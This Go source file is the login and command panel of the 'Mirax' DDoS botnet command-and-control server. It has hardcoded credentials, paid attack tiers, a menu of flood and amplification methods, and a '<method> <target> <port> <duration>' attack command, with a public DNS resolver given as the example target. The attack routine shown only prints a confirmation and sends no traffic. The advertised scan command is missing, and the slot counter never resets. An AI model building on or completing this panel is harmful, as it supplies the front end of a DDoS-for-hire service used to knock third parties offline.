package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

const (
	PORT    = 1337
	VERSION = "1.0"
)

var clients = make(map[net.Conn]string)
var totalBots = 0
var totalAttacks = 0

func getMaxSlots(plan string) int {
	switch plan {
	case "VIP":
		return 10
	case "PREMIUM":
		return 5
	default:
		return 1
	}
}

func main() {
	listener, err := net.Listen("tcp", ":"+strconv.Itoa(PORT))
	if err != nil {
		fmt.Println("[-] Failed to start server:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Println("[+] Mirax C2 started on port", PORT)
	fmt.Println("[+] Waiting for connections...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleClient(conn)
	}
}

func sendLine(conn net.Conn, text string) {
	conn.Write([]byte(text + "\r\n"))
}

func sendPrompt(conn net.Conn, text string) {
	conn.Write([]byte(text))
}

func updateTitle(conn net.Conn, username, plan string) {
	maxSlots := getMaxSlots(plan)
	title := fmt.Sprintf("\033]0;%s | Slots: %d/%d | Servers: %d\007", username, totalAttacks, maxSlots, totalBots)
	conn.Write([]byte(title))
}

func handleClient(conn net.Conn) {
	defer conn.Close()

	updateTitle(conn, "Login", "USER")

	sendPrompt(conn, "Username: ")
	username, _ := bufio.NewReader(conn).ReadString('\n')
	username = strings.TrimSpace(username)

	sendPrompt(conn, "Password: ")
	password, _ := bufio.NewReader(conn).ReadString('\n')
	password = strings.TrimSpace(password)

	if !authLogin(username, password) {
		sendLine(conn, "Invalid credentials!")
		return
	}

	plan := getUserPlan(username)

	clients[conn] = username
	defer delete(clients, conn)

	updateTitle(conn, username, plan)

	showHome(conn, username)

	for {
		sendPrompt(conn, "Root@mirax>> ")
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(strings.ToLower(cmd))

		if cmd == "" {
			continue
		}

		parts := strings.Fields(cmd)

		switch parts[0] {
		case "help":
			showHelp(conn)
		case "bots":
			showBots(conn)
		case "attacks":
			showAttacks(conn)
		case "methods":
			showMethods(conn)
		case "plan":
			showPlan(conn)
		case "owner":
			showOwner(conn)
		case "clear":
			conn.Write([]byte("\033[2J\033[H"))
			showHome(conn, username)
		case "logout", "exit":
			sendLine(conn, "Goodbye!")
			return
		default:
			// Attack command: <method> <target> <port> <duration>
			if len(parts) == 4 {
				method := parts[0]
				target := parts[1]
				port := parts[2]
				duration := parts[3]
				startAttack(conn, method, target, port, duration, username, plan)
			} else {
				sendLine(conn, "Unknown command. Type 'help' for commands.")
			}
		}
	}
}

func showHome(conn net.Conn, username string) {
	sendLine(conn, "")
	sendLine(conn, "Welcome to Mirax "+username+", Your now connected to Mirax servers.")
	sendLine(conn, "[ + ] Type help to see all commands")
	sendLine(conn, "[ + ] Github https://github.com/itsreverance")
	sendLine(conn, "")
}

func showHelp(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "help     - Shows this menu")
	sendLine(conn, "bots     - List all connected bots")
	sendLine(conn, "attacks  - Show active attacks")
	sendLine(conn, "methods  - List attack methods")
	sendLine(conn, "scan     - Scan a network range")
	sendLine(conn, "clear    - Clear the screen")
	sendLine(conn, "logout   - Disconnect from C2")
	sendLine(conn, "plan     - Show your subscription plan")
	sendLine(conn, "owner    - Show owner info")
	sendLine(conn, "")
	sendLine(conn, "Attack: <method> <target> <port> <duration>")
	sendLine(conn, "Example: udp 8.8.8.8 53 30")
	sendLine(conn, "")
}

func showMethods(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "udp       UDP bypass flood")
	sendLine(conn, "tcp       TCP bypass flood")
	sendLine(conn, "syn       SYN flood")
	sendLine(conn, "httpget   HTTP GET flood")
	sendLine(conn, "httppost  HTTP POST flood")
	sendLine(conn, "gre       GRE/IPIP flood")
	sendLine(conn, "dns       DNS amplification")
	sendLine(conn, "hold      Connection hold")
	sendLine(conn, "mix       Mixed attack")
	sendLine(conn, "")
}

func showOwner(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "GitHub: https://github.com/itsreverance")
	sendLine(conn, "")
}

func showPlan(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "VIP      - Unlimited attacks, 3600s max, all methods")
	sendLine(conn, "PREMIUM  - 500 attacks/day, 1200s max, most methods")
	sendLine(conn, "USER     - 50 attacks/day, 300s max, UDP/TCP/SYN only")
	sendLine(conn, "")
}

func showBots(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "Connected Bots: "+strconv.Itoa(totalBots))
	sendLine(conn, "  x86_64: 0")
	sendLine(conn, "  armv7l: 0")
	sendLine(conn, "  mips: 0")
	sendLine(conn, "")
}

func showAttacks(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "Active Attacks: "+strconv.Itoa(totalAttacks))
	sendLine(conn, "  IP            Port  Method   Time Left  User")
	sendLine(conn, "  No active attacks.")
	sendLine(conn, "")
}

func startAttack(conn net.Conn, method, target, port, duration, username, plan string) {
	maxSlots := getMaxSlots(plan)
	if totalAttacks >= maxSlots {
		sendLine(conn, "")
		sendLine(conn, "[!] Slot limit reached! Max slots: "+strconv.Itoa(maxSlots))
		sendLine(conn, "")
		return
	}

	totalAttacks++
	updateTitle(conn, username, plan)

	sendLine(conn, "")
	sendLine(conn, "[Attack Launched!]")
	sendLine(conn, " Target: "+target)
	sendLine(conn, " Port: "+port)
	sendLine(conn, " Method: ."+strings.ToUpper(method))
	sendLine(conn, " Duration: "+duration+"s")
	sendLine(conn, "")
}

func authLogin(username, password string) bool {
	if username == "root" && password == "mirax123" {
		return true
	}
	if username == "premium" && password == "premium123" {
		return true
	}
	if username == "user" && password == "user123" {
		return true
	}
	return false
}

func getUserPlan(username string) string {
	if username == "root" {
		return "VIP"
	}
	if username == "premium" {
		return "PREMIUM"
	}
	return "USER"
}